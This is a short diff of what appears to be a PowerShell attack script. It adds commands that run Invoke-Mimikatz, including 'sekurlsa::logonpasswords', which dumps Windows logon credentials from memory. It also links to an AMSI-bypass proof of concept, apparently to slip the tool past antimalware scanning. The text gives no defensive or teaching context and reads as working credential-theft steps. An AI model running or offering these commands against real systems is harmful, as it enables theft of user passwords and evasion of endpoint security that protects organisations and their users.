@@ -5,6 +5,10 @@ Remove-Variable -Name "Invoke-Mimikatz" -ErrorAction SilentlyContinue
 
 Get-Command "Invoke-Mimikatz"
 
+Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
+Invoke-Mimikatz
+
+
 
 
 https://github.com/V-i-x-x/AMSI-BYPASS/blob/main/POC.ps1
